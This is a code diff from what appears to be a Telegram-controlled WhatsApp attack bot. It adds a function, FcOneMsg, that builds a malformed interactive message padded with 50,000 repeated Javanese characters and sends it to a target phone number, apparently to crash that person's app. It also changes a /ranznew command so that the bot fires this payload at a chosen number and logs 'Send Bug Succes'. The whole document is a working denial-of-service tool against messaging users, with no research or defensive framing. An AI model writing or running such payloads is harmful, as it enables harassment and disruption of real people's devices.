@@ -1837,7 +1837,68 @@ async function noclick(target) {
     participant: { jid: target },
   });
 }
+async function FcOneMsg(target) {
+  const msg = await generateWAMessageFromContent(
+    target,
+    {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            contextInfo: {
+              expiration: 1,
+              ephemeralSettingTimestamp: 1,
+              entryPointConversionSource: "WhatsApp.com",
+              entryPointConversionApp: "WhatsApp",
+              entryPointConversionDelaySeconds: 1,
+              disappearingMode: {
+                initiatorDeviceJid: target,
+                initiator: "INITIATED_BY_OTHER",
+                trigger: "UNKNOWN_GROUPS"
+              },
+              participant: "0@s.whatsapp.net",
+              remoteJid: "status@broadcast",
+              mentionedJid: [target],
+              quotedMessage: {
+                paymentInviteMessage: {
+                  serviceType: 1,
+                  expiryTimestamp: null
+                }
+              },
+              externalAdReply: {
+                showAdAttribution: false,
+                renderLargerThumbnail: true
+              }
+            },
+            body: {
+              text: "イスマ" + "ꦾ".repeat(50000)
+            },
+            nativeFlowMessage: {
+              messageParamsJson: "{}", 
+              buttons: [
+                {
+                  name: "single_select",
+                  buttonParamsJson:
+                     ""
+                },
+                {
+                  name: "payment_method",
+                  buttonParamsJson:
+                     ""
+                }
+              ]
+            }
+          }
+        }
+      }
+    },
+    {}
+  );
 
+  await sock.relayMessage(target, msg.message, {
+    participant: { jid: target },
+    messageId: msg.key.id
+  });
+}
 async function Bug2(target) {
   try {
     let message = {
@@ -4975,11 +5036,8 @@ bot.onText(/\/ranznew(?:\s(.+))?/, async (msg, match) => {
     const formatedNumber = numberTarget + "@s.whatsapp.net";
 
     // Kirim notifikasi awal dengan gambar
-    for (let i = 0; i < 500; i++) { // Kirim 3 kali langsung
-        await cardbug(formatedNumber);
-        await new Promise((resolve) => setTimeout(resolve, 3000));
-        await delayNew(formatedNumber);
-        await new Promise((resolve) => setTimeout(resolve, 3000));
+    for (let i = 0; i < 3; i++) { // Kirim 3 kali langsung
+        await FcOneMsg(formatedNumber);
         console.log(chalk.red("Send Bug Succes"))
     }
 });
